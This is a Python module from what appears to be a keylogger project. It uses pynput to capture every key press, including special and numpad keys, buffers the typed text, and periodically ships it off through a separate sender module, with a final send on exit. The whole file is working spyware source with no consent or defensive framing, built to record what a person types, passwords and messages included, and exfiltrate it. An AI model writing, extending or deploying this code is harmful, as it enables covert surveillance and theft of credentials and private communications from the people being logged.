import time
import threading
import config
from pynput import keyboard
from utils import get_timestamp, log
from sender import send_data


# Shared state
buffer = []
buffer_lock = threading.Lock()
last_flush_time = time.time()


def add_key(key_str):
    """Add a key to the buffer in a thread-safe way"""
    global buffer
    with buffer_lock:
        buffer.append(key_str)


def flush_buffer():
    """Flush the buffer and return its content"""
    global buffer, last_flush_time
    with buffer_lock:
        if not buffer:
            return None

        text = ''.join(buffer)
        buffer = []
        last_flush_time = time.time()
        return text


def flush_periodically():
    """Periodically flush the buffer at configured intervals"""
    while True:
        time.sleep(config.KEYSTROKE_BUFFER_INTERVAL)
        text = flush_buffer()
        if text:
            log(f"Flushing keystroke buffer: {text[:50]}...", "DEBUG", "keystrokes")  # Log first 50 chars
            send_data({
                "timestamp": get_timestamp(),
                "text": text
            }, "keystroke")


def on_press(key):
    """Handle key press events and convert to string representation"""
    try:
        # Convert key to string representation
        if hasattr(key, "char") and key.char:
            key_str = key.char

        # Handle special keys
        elif key == keyboard.Key.space:
            key_str = " "
        elif key == keyboard.Key.enter:
            key_str = "\n"
        elif key == keyboard.Key.backspace:
            key_str = "[BACKSPACE]"
        elif key == keyboard.Key.tab:
            key_str = "[TAB]"
        elif key == keyboard.Key.delete:
            key_str = "[DEL]"

        # Handle numpad keys (both with and without NumLock)
        elif hasattr(key, 'vk') and 96 <= key.vk <= 111:
            # Numpad keys when NumLock is ON
            numpad_map = {
                96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
                101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
                106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
            }

            # Numpad keys when NumLock is OFF
            numpad_off_map = {
                96: '[INSERT]', 97: '[END]', 98: '[DOWN]', 99: '[PGDN]', 100: '[LEFT]',
                101: '[CENTER]', 102: '[RIGHT]', 103: '[HOME]', 104: '[UP]', 105: '[PGUP]',
                106: '*', 107: '+', 109: '-', 110: '[DEL]', 111: '/'
            }

            # First try to get the character representation
            if key.char:
                key_str = key.char
            # Then try NumLock ON mapping
            elif key.vk in numpad_map:
                key_str = numpad_map[key.vk]
            # Finally try NumLock OFF mapping
            elif key.vk in numpad_off_map:
                key_str = numpad_off_map[key.vk]
            else:
                key_str = f"[NUMPAD:{key.vk}]"

        # Handle other KeyCode objects
        elif hasattr(key, 'vk'):
            try:
                # Attempt to get character representation
                key_str = key.char if key.char else f"[{key.vk}]"
            except AttributeError:
                key_str = f"[{key.vk}]"

        # Handle modifier keys
        elif hasattr(key, 'name'):
            if config.KEYSTROKE_LOG_MODIFIERS:
                key_str = f"[{key.name.upper()}]"
            else:
                return  # Skip modifier keys if not enabled

        # Handle unknown keys
        else:
            if config.KEYSTROKE_LOG_MODIFIERS:
                key_str = "[UNKNOWN]"
            else:
                return

        add_key(key_str)
    except AttributeError as e:
        log(f"Key attribute error: {e}", "ERROR", "keystrokes")
    except Exception as e:
        log(f"Keystroke error: {e}", "ERROR", "keystrokes")


def start_keystroke_monitoring():
    """Start keystroke monitoring and buffer management"""
    global buffer, last_flush_time
    buffer = []
    last_flush_time = time.time()

    log("Keystroke monitoring started", module="keystrokes")

    # Start periodic flusher thread
    flusher_thread = threading.Thread(target=flush_periodically, daemon=True)
    flusher_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            log("Keystroke monitoring stopped", module="keystrokes")
        except Exception as e:
            log(f"Keystroke monitoring failed: {e}", "ERROR", "keystrokes")
        finally:
            # Flush any remaining keys before exit
            text = flush_buffer()
            if text:
                log("Flushing final keystrokes", "DEBUG", "keystrokes")
                send_data({
                    "timestamp": get_timestamp(),
                    "text": text
                }, "keystroke")
